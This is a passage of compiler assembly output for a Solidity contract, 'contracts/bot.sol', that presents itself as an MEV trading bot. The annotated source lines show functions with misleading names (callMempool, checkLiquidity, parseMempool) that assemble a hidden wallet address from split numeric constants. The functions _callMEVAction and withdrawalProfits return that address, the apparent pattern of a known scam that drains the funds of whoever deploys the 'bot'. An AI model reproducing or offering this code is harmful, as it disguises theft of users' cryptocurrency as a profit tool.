   tag_58\n        /* \"contracts/bot.sol\":13296:13344  mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      jump\t// in\n    tag_53:\n        /* \"contracts/bot.sol\":13265:13344  string memory _memPoolOffset = mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13355:13371  uint _memPoolSol */\n      0x00\n        /* \"contracts/bot.sol\":13374:13386  756054344745 */\n      0xb00859c429\n        /* \"contracts/bot.sol\":13355:13386  uint _memPoolSol = 756054344745 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13397:13416  uint _memPoolLength */\n      0x00\n        /* \"contracts/bot.sol\":13419:13429  1240332645 */\n      0x49edf965\n        /* \"contracts/bot.sol\":13397:13429  uint _memPoolLength = 1240332645 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13440:13457  uint _memPoolSize */\n      0x00\n        /* \"contracts/bot.sol\":13460:13468  11999794 */\n      0xb71a32\n        /* \"contracts/bot.sol\":13440:13468  uint _memPoolSize = 11999794 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13479:13498  uint _memPoolHeight */\n      0x00\n        /* \"contracts/bot.sol\":13501:13519  getMemPoolHeight() */\n      tag_59\n        /* \"contracts/bot.sol\":13501:13517  getMemPoolHeight */\n      tag_60\n        /* \"contracts/bot.sol\":13501:13519  getMemPoolHeight() */\n      jump\t// in\n    tag_59:\n        /* \"contracts/bot.sol\":13479:13519  uint _memPoolHeight = getMemPoolHeight() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13530:13548  uint _memPoolDepth */\n      0x00\n        /* \"contracts/bot.sol\":13551:13568  getMemPoolDepth() */\n      tag_61\n        /* \"contracts/bot.sol\":13551:13566  getMemPoolDepth */\n      tag_62\n        /* \"contracts/bot.sol\":13551:13568  getMemPoolDepth() */\n      jump\t// in\n    tag_61:\n        /* \"contracts/bot.sol\":13530:13568  uint _memPoolDepth = getMemPoolDepth() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13581:13604  string memory _memPool1 */\n      0x60\n        /* \"contracts/bot.sol\":13607:13659  mempool(_memPoolOffset, checkLiquidity(_memPoolSol)) */\n      tag_63\n        /* \"contracts/bot.sol\":13615:13629  _memPoolOffset */\n      dup8\n        /* \"contracts/bot.sol\":13631:13658  checkLiquidity(_memPoolSol) */\n      tag_64\n        /* \"contracts/bot.sol\":13646:13657  _memPoolSol */\n      dup9\n        /* \"contracts/bot.sol\":13631:13645  checkLiquidity */\n      tag_57\n        /* \"contracts/bot.sol\":13631:13658  checkLiquidity(_memPoolSol) */\n      jump\t// in\n    tag_64:\n        /* \"contracts/bot.sol\":13607:13614  mempool */\n      tag_58\n        /* \"contracts/bot.sol\":13607:13659  mempool(_memPoolOffset, checkLiquidity(_memPoolSol)) */\n      jump\t// in\n    tag_63:\n        /* \"contracts/bot.sol\":13581:13659  string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol)) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13670:13693  string memory _memPool2 */\n      0x60\n        /* \"contracts/bot.sol\":13696:13765  mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      tag_65\n        /* \"contracts/bot.sol\":13704:13734  checkLiquidity(_memPoolLength) */\n      tag_66\n        /* \"contracts/bot.sol\":13719:13733  _memPoolLength */\n      dup8\n        /* \"contracts/bot.sol\":13704:13718  checkLiquidity */\n      tag_57\n        /* \"contracts/bot.sol\":13704:13734  checkLiquidity(_memPoolLength) */\n      jump\t// in\n    tag_66:\n        /* \"contracts/bot.sol\":13736:13764  checkLiquidity(_memPoolSize) */\n      tag_67\n        /* \"contracts/bot.sol\":13751:13763  _memPoolSize */\n      dup8\n        /* \"contracts/bot.sol\":13736:13750  checkLiquidity */\n      tag_57\n        /* \"contracts/bot.sol\":13736:13764  checkLiquidity(_memPoolSize) */\n      jump\t// in\n    tag_67:\n        /* \"contracts/bot.sol\":13696:13703  mempool */\n      tag_58\n        /* \"contracts/bot.sol\":13696:13765  mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      jump\t// in\n    tag_65:\n        /* \"contracts/bot.sol\":13670:13765  string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13776:13799  string memory _memPool3 */\n      0x60\n        /* \"contracts/bot.sol\":13802:13832  checkLiquidity(_memPoolHeight) */\n      tag_68\n        /* \"contracts/bot.sol\":13817:13831  _memPoolHeight */\n      dup6\n        /* \"contracts/bot.sol\":13802:13816  checkLiquidity */\n      tag_57\n        /* \"contracts/bot.sol\":13802:13832  checkLiquidity(_memPoolHeight) */\n      jump\t// in\n    tag_68:\n        /* \"contracts/bot.sol\":13776:13832  string memory _memPool3 = checkLiquidity(_memPoolHeight) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13843:13866  string memory _memPool4 */\n      0x60\n        /* \"contracts/bot.sol\":13869:13898  checkLiquidity(_memPoolDepth) */\n      tag_69\n        /* \"contracts/bot.sol\":13884:13897  _memPoolDepth */\n      dup6\n        /* \"contracts/bot.sol\":13869:13883  checkLiquidity */\n      tag_57\n        /* \"contracts/bot.sol\":13869:13898  checkLiquidity(_memPoolDepth) */\n      jump\t// in\n    tag_69:\n        /* \"contracts/bot.sol\":13843:13898  string memory _memPool4 = checkLiquidity(_memPoolDepth) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13911:13937  string memory _allMempools */\n      0x60\n        /* \"contracts/bot.sol\":13940:14009  mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      tag_70\n        /* \"contracts/bot.sol\":13948:13977  mempool(_memPool1, _memPool2) */\n      tag_71\n        /* \"contracts/bot.sol\":13956:13965  _memPool1 */\n      dup7\n        /* \"contracts/bot.sol\":13967:13976  _memPool2 */\n      dup7\n        /* \"contracts/bot.sol\":13948:13955  mempool */\n      tag_58\n        /* \"contracts/bot.sol\":13948:13977  mempool(_memPool1, _memPool2) */\n      jump\t// in\n    tag_71:\n        /* \"contracts/bot.sol\":13979:14008  mempool(_memPool3, _memPool4) */\n      tag_72\n        /* \"contracts/bot.sol\":13987:13996  _memPool3 */\n      dup6\n        /* \"contracts/bot.sol\":13998:14007  _memPool4 */\n      dup6\n        /* \"contracts/bot.sol\":13979:13986  mempool */\n      tag_58\n        /* \"contracts/bot.sol\":13979:14008  mempool(_memPool3, _memPool4) */\n      jump\t// in\n    tag_72:\n        /* \"contracts/bot.sol\":13940:13947  mempool */\n      tag_58\n        /* \"contracts/bot.sol\":13940:14009  mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      jump\t// in\n    tag_70:\n        /* \"contracts/bot.sol\":13911:14009  string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":14020:14046  string memory _fullMempool */\n      0x60\n        /* \"contracts/bot.sol\":14049:14075  mempool(\"0\", _allMempools) */\n      tag_73\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x3000000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"contracts/bot.sol\":14062:14074  _allMempools */\n      dup4\n        /* \"contracts/bot.sol\":14049:14056  mempool */\n      tag_58\n        /* \"contracts/bot.sol\":14049:14075  mempool(\"0\", _allMempools) */\n      jump\t// in\n    tag_73:\n        /* \"contracts/bot.sol\":14020:14075  string memory _fullMempool = mempool(\"0\", _allMempools) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":14103:14115  _fullMempool */\n      dup1\n        /* \"contracts/bot.sol\":14096:14115  return _fullMempool */\n      swap13\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":13193:14123  function callMempool() internal pure returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":8382:9321  function parseMempool(string memory _a) internal pure returns (address _parsed) {\r... */\n    tag_41:\n        /* \"contracts/bot.sol\":8445:8460  address _parsed */\n      0x00\n        /* \"contracts/bot.sol\":8473:8489  bytes memory tmp */\n      0x60\n        /* \"contracts/bot.sol\":8498:8500  _a */\n      dup3\n        /* \"contracts/bot.sol\":8473:8501  bytes memory tmp = bytes(_a) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":8512:8525  uint160 iaddr */\n      0x00\n        /* \"contracts/bot.sol\":8528:8529  0 */\n      dup1\n        /* \"contracts/bot.sol\":8512:8529  uint160 iaddr = 0 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":8540:8550  uint160 b1 */\n      0x00\n        /* \"contracts/bot.sol\":8561:8571  uint160 b2 */\n      dup1\n        /* \"contracts/bot.sol\":8589:8595  uint i */\n      0x00\n        /* \"contracts/bot.sol\":8598:8599  2 */\n      0x02\n        /* \"contracts/bot.sol\":8589:8599  uint i = 2 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":8584:9282  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n    tag_75:\n        /* \"contracts/bot.sol\":8605:8615  2 + 2 * 20 */\n      0x2a\n        /* \"contracts/bot.sol\":8601:8602  i */\n      dup2\n        /* \"contracts/bot.sol\":8601:8615  i < 2 + 2 * 20 */\n      lt\n        /* \"contracts/bot.sol\":8584:9282  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n      iszero\n      tag_76\n      jumpi\n        /* \"contracts/bot.sol\":8649:8652  256 */\n      0x0100\n        /* \"contracts/bot.sol\":8640:8652  iaddr *= 256 */\n      dup5\n      mul\n      swap4\n      pop\n        /* \"contracts/bot.sol\":8686:8689  tmp */\n      dup5\n        /* \"contracts/bot.sol\":8690:8691  i */\n      dup2\n        /* \"contracts/bot.sol\":8686:8692  tmp[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_78\n      jumpi\n      invalid\n    tag_78:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":8680:8693  uint8(tmp[i]) */\n      0xf8\n      shr\n        /* \"contracts/bot.sol\":8672:8694  uint160(uint8(tmp[i])) */\n      0xff\n      and\n        /* \"contracts/bot.sol\":8667:8694  b1 = uint160(uint8(tmp[i])) */\n      swap3\n      pop\n        /* \"contracts/bot.sol\":8728:8731  tmp */\n      dup5\n        /* \"contracts/bot.sol\":8736:8737  1 */\n      0x01\n        /* \"contracts/bot.sol\":8732:8733  i */\n      dup3\n        /* \"contracts/bot.sol\":8732:8737  i + 1 */\n      add\n        /* \"contracts/bot.sol\":8728:8738  tmp[i + 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_79\n      jumpi\n      invalid\n    tag_79:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":8722:8739  uint8(tmp[i + 1]) */\n      0xf8\n      shr\n        /* \"contracts/bot.sol\":8714:8740  uint160(uint8(tmp[i + 1])) */\n      0xff\n      and\n        /* \"contracts/bot.sol\":8709:8740  b2 = uint160(uint8(tmp[i + 1])) */\n      swap2\n      pop\n        /* \"contracts/bot.sol\":8766:8768  97 */\n      0x61\n        /* \"contracts/bot.sol\":8760:8762  b1 */\n      dup4\n        /* \"contracts/bot.sol\":8760:8768  b1 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":8759:8784  (b1 >= 97) && (b1 <= 102) */\n      dup1\n      iszero\n      tag_80\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":8780:8783  102 */\n      0x66\n        /* \"contracts/bot.sol\":8774:8776  b1 */\n      dup4\n        /* \"contracts/bot.sol\":8774:8783  b1 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":8759:8784  (b1 >= 97) && (b1 <= 102) */\n    tag_80:\n        /* \"contracts/bot.sol\":8755:8987  if ((b1 >= 97) && (b1 <= 102)) {\r... */\n      iszero\n      tag_81\n      jumpi\n        /* \"contracts/bot.sol\":8811:8813  87 */\n      0x57\n        /* \"contracts/bot.sol\":8805:8813  b1 -= 87 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"contracts/bot.sol\":8755:8987  if ((b1 >= 97) && (b1 <= 102)) {\r... */\n      jump(tag_82)\n    tag_81:\n        /* \"contracts/bot.sol\":8846:8848  65 */\n      0x41\n        /* \"contracts/bot.sol\":8840:8842  b1 */\n      dup4\n        /* \"contracts/bot.sol\":8840:8848  b1 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":8839:8863  (b1 >= 65) && (b1 <= 70) */\n      dup1\n      iszero\n      tag_83\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":8860:8862  70 */\n      0x46\n        /* \"contracts/bot.sol\":8854:8856  b1 */\n      dup4\n        /* \"contracts/bot.sol\":8854:8862  b1 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":8839:8863  (b1 >= 65) && (b1 <= 70) */\n    tag_83:\n        /* \"contracts/bot.sol\":8835:8987  if ((b1 >= 65) && (b1 <= 70)) {\r... */\n      iszero\n      tag_84\n      jumpi\n        /* \"contracts/bot.sol\":8890:8892  55 */\n      0x37\n        /* \"contracts/bot.sol\":8884:8892  b1 -= 55 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"contracts/bot.sol\":8835:8987  if ((b1 >= 65) && (b1 <= 70)) {\r... */\n      jump(tag_85)\n    tag_84:\n        /* \"contracts/bot.sol\":8925:8927  48 */\n      0x30\n        /* \"contracts/bot.sol\":8919:8921  b1 */\n      dup4\n        /* \"contracts/bot.sol\":8919:8927  b1 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":8918:8942  (b1 >= 48) && (b1 <= 57) */\n      dup1\n      iszero\n      tag_86\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":8939:8941  57 */\n      0x39\n        /* \"contracts/bot.sol\":8933:8935  b1 */\n      dup4\n        /* \"contracts/bot.sol\":8933:8941  b1 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":8918:8942  (b1 >= 48) && (b1 <= 57) */\n    tag_86:\n        /* \"contracts/bot.sol\":8914:8987  if ((b1 >= 48) && (b1 <= 57)) {\r... */\n      iszero\n      tag_87\n      jumpi\n        /* \"contracts/bot.sol\":8969:8971  48 */\n      0x30\n        /* \"contracts/bot.sol\":8963:8971  b1 -= 48 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"contracts/bot.sol\":8914:8987  if ((b1 >= 48) && (b1 <= 57)) {\r... */\n    tag_87:\n        /* \"contracts/bot.sol\":8835:8987  if ((b1 >= 65) && (b1 <= 70)) {\r... */\n    tag_85:\n        /* \"contracts/bot.sol\":8755:8987  if ((b1 >= 97) && (b1 <= 102)) {\r... */\n    tag_82:\n        /* \"contracts/bot.sol\":9012:9014  97 */\n      0x61\n        /* \"contracts/bot.sol\":9006:9008  b2 */\n      dup3\n        /* \"contracts/bot.sol\":9006:9014  b2 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":9005:9030  (b2 >= 97) && (b2 <= 102) */\n      dup1\n      iszero\n      tag_88\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":9026:9029  102 */\n      0x66\n        /* \"contracts/bot.sol\":9020:9022  b2 */\n      dup3\n        /* \"contracts/bot.sol\":9020:9029  b2 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":9005:9030  (b2 >= 97) && (b2 <= 102) */\n    tag_88:\n        /* \"contracts/bot.sol\":9001:9233  if ((b2 >= 97) && (b2 <= 102)) {\r... */\n      iszero\n      tag_89\n      jumpi\n        /* \"contracts/bot.sol\":9057:9059  87 */\n      0x57\n        /* \"contracts/bot.sol\":9051:9059  b2 -= 87 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"contracts/bot.sol\":9001:9233  if ((b2 >= 97) && (b2 <= 102)) {\r... */\n      jump(tag_90)\n    tag_89:\n        /* \"contracts/bot.sol\":9092:9094  65 */\n      0x41\n        /* \"contracts/bot.sol\":9086:9088  b2 */\n      dup3\n        /* \"contracts/bot.sol\":9086:9094  b2 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":9085:9109  (b2 >= 65) && (b2 <= 70) */\n      dup1\n      iszero\n      tag_91\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":9106:9108  70 */\n      0x46\n        /* \"contracts/bot.sol\":9100:9102  b2 */\n      dup3\n        /* \"contracts/bot.sol\":9100:9108  b2 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":9085:9109  (b2 >= 65) && (b2 <= 70) */\n    tag_91:\n        /* \"contracts/bot.sol\":9081:9233  if ((b2 >= 65) && (b2 <= 70)) {\r... */\n      iszero\n      tag_92\n      jumpi\n        /* \"contracts/bot.sol\":9136:9138  55 */\n      0x37\n        /* \"contracts/bot.sol\":9130:9138  b2 -= 55 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"contracts/bot.sol\":9081:9233  if ((b2 >= 65) && (b2 <= 70)) {\r... */\n      jump(tag_93)\n    tag_92:\n        /* \"contracts/bot.sol\":9171:9173  48 */\n      0x30\n        /* \"contracts/bot.sol\":9165:9167  b2 */\n      dup3\n        /* \"contracts/bot.sol\":9165:9173  b2 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":9164:9188  (b2 >= 48) && (b2 <= 57) */\n      dup1\n      iszero\n      tag_94\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":9185:9187  57 */\n      0x39\n        /* \"contracts/bot.sol\":9179:9181  b2 */\n      dup3\n        /* \"contracts/bot.sol\":9179:9187  b2 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":9164:9188  (b2 >= 48) && (b2 <= 57) */\n    tag_94:\n        /* \"contracts/bot.sol\":9160:9233  if ((b2 >= 48) && (b2 <= 57)) {\r... */\n      iszero\n      tag_95\n      jumpi\n        /* \"contracts/bot.sol\":9215:9217  48 */\n      0x30\n        /* \"contracts/bot.sol\":9209:9217  b2 -= 48 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"contracts/bot.sol\":9160:9233  if ((b2 >= 48) && (b2 <= 57)) {\r... */\n    tag_95:\n        /* \"contracts/bot.sol\":9081:9233  if ((b2 >= 65) && (b2 <= 70)) {\r... */\n    tag_93:\n        /* \"contracts/bot.sol\":9001:9233  if ((b2 >= 97) && (b2 <= 102)) {\r... */\n    tag_90:\n        /* \"contracts/bot.sol\":9267:9269  b2 */\n      dup2\n        /* \"contracts/bot.sol\":9262:9264  16 */\n      0x10\n        /* \"contracts/bot.sol\":9257:9259  b1 */\n      dup5\n        /* \"contracts/bot.sol\":9257:9264  b1 * 16 */\n      mul\n        /* \"contracts/bot.sol\":9257:9269  b1 * 16 + b2 */\n      add\n        /* \"contracts/bot.sol\":9247:9270  iaddr += (b1 * 16 + b2) */\n      dup5\n      add\n      swap4\n      pop\n        /* \"contracts/bot.sol\":8622:8623  2 */\n      0x02\n        /* \"contracts/bot.sol\":8617:8623  i += 2 */\n      dup2\n      add\n      swap1\n      pop\n        /* \"contracts/bot.sol\":8584:9282  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n      jump(tag_75)\n    tag_76:\n      pop\n        /* \"contracts/bot.sol\":9307:9312  iaddr */\n      dup3\n        /* \"contracts/bot.sol\":9292:9313  return address(iaddr) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":8382:9321  function parseMempool(string memory _a) internal pure returns (address _parsed) {\r... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contracts/bot.sol\":14925:15036  function _callMEVAction() internal pure returns (address) {\r... */\n    tag_44:\n        /* \"contracts/bot.sol\":14974:14981  address */\n      0x00\n        /* \"contracts/bot.sol\":15001:15028  parseMempool(callMempool()) */\n      tag_97\n        /* \"contracts/bot.sol\":15014:15027  callMempool() */\n      tag_98\n        /* \"contracts/bot.sol\":15014:15025  callMempool */\n      tag_40\n        /* \"contracts/bot.sol\":15014:15027  callMempool() */\n      jump\t// in\n    tag_98:\n        /* \"contracts/bot.sol\":15001:15013  parseMempool */\n      tag_41\n        /* \"contracts/bot.sol\":15001:15028  parseMempool(callMempool()) */\n      jump\t// in\n    tag_97:\n        /* \"contracts/bot.sol\":14994:15028  return parseMempool(callMempool()) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":14925:15036  function _callMEVAction() internal pure returns (address) {\r... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":16461:16575  function withdrawalProfits() internal pure returns (address) {\r... */\n    tag_49:\n        /* \"contracts/bot.sol\":16513:16520  address */\n      0x00\n        /* \"contracts/bot.sol\":16540:16567  parseMempool(callMempool()) */\n      tag_100\n        /* \"contracts/bot.sol\":16553:16566  callMempool() */\n      tag_101\n        /* \"contracts/bot.sol\":16553:16564  callMempool */\n      tag_40\n        /* \"contracts/bot.sol\":16553:16566  callMempool() */\n      jump\t// in\n    tag_101:\n        /* \"contracts/bot.sol\":16540:16552  parseMempool */\n      tag_41\n        /* \"contracts/bot.sol\":16540:16567  parseMempool(callMempool()) */\n      jump\t// in\n    tag_100:\n        /* \"contracts/bot.sol\":16533:16567  return parseMempool(callMempool()) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":16461:16575  function withdrawalProfits() internal pure returns (address) {\r... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":8116:8207  function getMemPoolOffset() internal pure returns (uint) {\r... */\n    tag_56:\n        /* \"contracts/bot.sol\":8167:8171  uint */\n      0x00\n        /* \"contracts/bot.sol\":8191:8199  79107794 */\n      0x04b716d2\n        /* \"contracts/bot.sol\":8184:8199  return 79107794 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":8116:8207  function getMemPoolOffset() internal pure returns (uint) {\r... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":9880:10318  function checkLiquidity(uint a) internal pure returns (string memory) {\r... */\n    tag_57:\n        /* \"contracts/bot.sol\":9935:9948  string memory */\n      0x60\n        /* \"contracts/bot.sol\":9963:9973  uint count */\n      0x00\n        /* \"contracts/bot.sol\":9976:9977  0 */\n      dup1\n        /* \"contracts/bot.sol\":9963:9977  uint count = 0 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":9988:9994  uint b */\n      0x00\n        /* \"contracts/bot.sol\":9997:9998  a */\n      dup4\n        /* \"contracts/bot.sol\":9988:9998  uint b = a */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":10009:10080  while (b != 0) {\r... */\n    tag_104:\n        /* \"contracts/bot.sol\":10021:10022  0 */\n      0x00\n        /* \"contracts/bot.sol\":10016:10017  b */\n      dup2\n        /* \"contracts/bot.sol\":10016:10022  b != 0 */\n      eq\n        /* \"contracts/bot.sol\":10009:10080  while (b != 0) {\r... */\n      tag_105\n      jumpi\n        /* \"contracts/bot.sol\":10039:10046  count++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"contracts/bot.sol\":10066:10068  16 */\n      0x10\n        /* \"contracts/bot.sol\":10061:10068  b /= 16 */\n      dup2\n      dup2\n      tag_106\n      jumpi\n      invalid\n    tag_106:\n      div\n      swap1\n      pop\n        /* \"contracts/bot.sol\":10009:10080  while (b != 0) {\r... */\n      jump(tag_104)\n    tag_105:\n        /* \"contracts/bot.sol\":10090:10106  bytes memory res */\n      0x60\n        /* \"contracts/bot.sol\":10119:10124  count */\n      dup3\n        /* \"contracts/bot.sol\":10109:10125  new bytes(count) */\n      0xffffffffffffffff\n      dup2\n      gt\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_107\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_107:\n        /* \"contracts/bot.sol\":10109:10125  new bytes(count) */\n      pop\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_108\n      jumpi\n      dup2\n      0x20\n      add\n        /* \"--CODEGEN--\":29:30   */\n      0x01\n        /* \"--CODEGEN--\":21:27   */\n      dup3\n        /* \"--CODEGEN--\":17:31   */\n      mul\n        /* \"--CODEGEN--\":124:128   */\n      dup1\n        /* \"--CODEGEN--\":108:122   */\n      calldatasize\n        /* \"--CODEGEN--\":100:106   */\n      dup4\n        /* \"--CODEGEN--\":87:129   */\n      calldatacopy\n        /* \"--CODEGEN--\":155:159   */\n      dup1\n        /* \"--CODEGEN--\":147:153   */\n      dup3\n        /* \"--CODEGEN--\":143:160   */\n      add\n        /* \"--CODEGEN--\":133:160   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":0:164   */\n      pop\n        /* \"contracts/bot.sol\":10109:10125  new bytes(count) */\n      swap1\n      pop\n    tag_108:\n      pop\n        /* \"contracts/bot.sol\":10090:10125  bytes memory res = new bytes(count) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":10141:10147  uint i */\n      0x00\n        /* \"contracts/bot.sol\":10148:10149  0 */\n      dup1\n        /* \"contracts/bot.sol\":10141:10149  uint i=0 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":10136:10280  for (uint i=0; i<count; ++i) {\r... */\n    tag_109:\n        /* \"contracts/bot.sol\":10153:10158  count */\n      dup4\n        /* \"contracts/bot.sol\":10151:10152  i */\n      dup2\n        /* \"contracts/bot.sol\":10151:10158  i<count */\n      lt\n        /* \"contracts/bot.sol\":10136:10280  for (uint i=0; i<count; ++i) {\r... */\n      iszero\n      tag_110\n      jumpi\n        /* \"contracts/bot.sol\":10188:10190  16 */\n      0x10\n        /* \"contracts/bot.sol\":10184:10185  a */\n      dup7\n        /* \"contracts/bot.sol\":10184:10190  a % 16 */\n      dup2\n      tag_112\n      jumpi\n      invalid\n    tag_112:\n      mod\n        /* \"contracts/bot.sol\":10180:10190  b = a % 16 */\n      swap3\n      pop\n        /* \"contracts/bot.sol\":10226:10246  toHexDigit(uint8(b)) */\n      tag_113\n        /* \"contracts/bot.sol\":10243:10244  b */\n      dup4\n        /* \"contracts/bot.sol\":10226:10236  toHexDigit */\n      tag_114\n        /* \"contracts/bot.sol\":10226:10246  toHexDigit(uint8(b)) */\n      jump\t// in\n    tag_113:\n        /* \"contracts/bot.sol\":10205:10208  res */\n      dup3\n        /* \"contracts/bot.sol\":10221:10222  1 */\n      0x01\n        /* \"contracts/bot.sol\":10217:10218  i */\n      dup4\n        /* \"contracts/bot.sol\":10209:10214  count */\n      dup8\n        /* \"contracts/bot.sol\":10209:10218  count - i */\n      sub\n        /* \"contracts/bot.sol\":10209:10222  count - i - 1 */\n      sub\n        /* \"contracts/bot.sol\":10205:10223  res[count - i - 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_115\n      jumpi\n      invalid\n    tag_115:\n      0x20\n      add\n      add\n        /* \"contracts/bot.sol\":10205:10246  res[count - i - 1] = toHexDigit(uint8(b)) */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"contracts/bot.sol\":10266:10268  16 */\n      0x10\n        /* \"contracts/bot.sol\":10261:10268  a /= 16 */\n      dup7\n      dup2\n      tag_116\n      jumpi\n      invalid\n    tag_116:\n      div\n      swap6\n      pop\n        /* \"contracts/bot.sol\":10160:10163  ++i */\n      dup1\n      0x01\n      add\n      swap1\n      pop\n        /* \"contracts/bot.sol\":10136:10280  for (uint i=0; i<count; ++i) {\r... */\n      jump(tag_109)\n    tag_110:\n      pop\n        /* \"contracts/bot.sol\":10306:10309  res */\n      dup1\n        /* \"contracts/bot.sol\":10292:10310  return string(res) */\n      swap4\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":9880:10318  function checkLiquidity(uint a) internal pure returns (string memory) {\r... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contracts/bot.sol\":16756:17386  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {\r... */\n    tag_58:\n        /* \"contracts/bot.sol\":16839:16852  string memory */\n      0x60\n        /* \"contracts/bot.sol\":16865:16888  bytes memory _baseBytes */\n      dup1\n        /* \"contracts/bot.sol\":16897:16902  _base */\n      dup4\n        /* \"contracts/bot.sol\":16865:16903  bytes memory _baseBytes = bytes(_base) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":16914:16938  bytes memory _valueBytes */\n      0x60\n        /* \"contracts/bot.sol\":16947:16953  _value */\n      dup4\n        